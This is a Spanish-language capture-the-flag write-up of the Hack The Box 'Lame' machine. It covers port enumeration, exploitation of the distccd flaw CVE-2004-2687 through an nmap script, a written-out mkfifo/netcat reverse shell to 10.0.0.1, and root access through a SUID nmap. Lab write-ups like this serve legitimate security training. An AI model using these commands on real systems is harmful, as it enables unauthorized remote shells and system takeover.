---
title: Lame
layout: page
permalink: /HTB_Lame
---

<h2 class="amarillo">Lame</h2>
<div id="logos" style="text-align: center;">
  <img src="/assets/images/HTB/Lame/lame.png" alt="under" oncontextmenu="return false;">
</div>

Encendemos la máquina Lame y nos da la dirección ip 10.129.2.65, probamos a lanzar 5 trazas ICMP para comprobar si estamos frente a un sistema Linux o Windows.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Lame/1.png" alt="under" oncontextmenu="return false;">
</div>

Vemos un TTL de 63, por tanto, estamos frente a una maquina Linux.

<h2 class="amarillo">Enumeración</h2>

Hacemos un escaneo con nmap para detectar los puertos abiertos `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.2.65` y posteriormente, le lanzamos la serie de scripts básicos de reconocimiento para detectar la versión y servicio que corren para cada puerto.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Lame/3.png" alt="under" oncontextmenu="return false;">
</div>

Comenzamos con el puerto 21 y el servicio ftp el cual tiene el acceso como usuario anonymous habilitado, pero no encontramos nada.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Lame/4.png" alt="under" oncontextmenu="return false;">
</div>
Luego miramos el puerto 445 con la herramienta smbclient tratando de listar con -L los recursos compartidos a nivel de red haciendo uso de una NullSession -N
<div style="text-align: center;">
  <img src="/assets/images/HTB/Lame/5.png" alt="under" oncontextmenu="return false;">
</div>
Tratamos de enumerar algunos recursos pero sin mucho éxito.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Lame/6.png" alt="under" oncontextmenu="return false;">
</div>
Volviendo a revisar con más detenimiento la captura de nmap, el servicio samba corre la versión 3.0. Haciendo uso de searchsploit samba 3.0 se encuentra una vulnerabilidad para explotar con Metasploit, pero aquí somos ganadores y hacemos las cosas bien.

<h2 class="amarillo">Explotación</h2>

Hay un CVE interesante CVE-2004-2687 relacionado al puerto 3632 distccd, según la fuente de <a href="https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html">nmap.org</a>.

> Detects and exploits a remote code execution vulnerability in the distributed compiler daemon distcc.
The vulnerability was disclosed in 2002, but is still present in modern implementation due to poor
configuration of the service.

El modo de uso de este script es el siguiente: `nmap -p 3632 <ip> --script distcc-exec --script-args="distcc-exec.cmd='id'"`
<div style="text-align: center;">
  <img src="/assets/images/HTB/Lame/7.png" alt="under" oncontextmenu="return false;">
</div>
Vemos que nos retorna el output del comando id y si probamos con which nc?
<div style="text-align: center;">
  <img src="/assets/images/HTB/Lame/8.png" alt="under" oncontextmenu="return false;">
</div>
nos podemos en escucha por el puerto 443, y hacemos uso de la reverse shell de mkfifo:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/Lame/9.png" alt="under" oncontextmenu="return false;">
</div>
Con la shell, podremos ir al directorio personal y tendremos la flag del usuario.
<div style="text-align: center;">
  <img src="/assets/images/HTB/Lame/10.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Escalada</h2>
Para la escalada, tenemos un caso muy extraño en el que al buscar por privilegios SUID en el sistema, encontramos nmap y con una versión muy antigua 4.53 la cual tiene la opción --interactive que nos permite ejecutar una shell y al ser SUID, ésta será como root: 
<div style="text-align: center;">
  <img src="/assets/images/HTB/Lame/12.png" alt="under" oncontextmenu="return false;">
</div>
<div style="text-align: center;">
  <img src="/assets/images/HTB/Lame/pwn.png" alt="under" oncontextmenu="return false;">
</div>
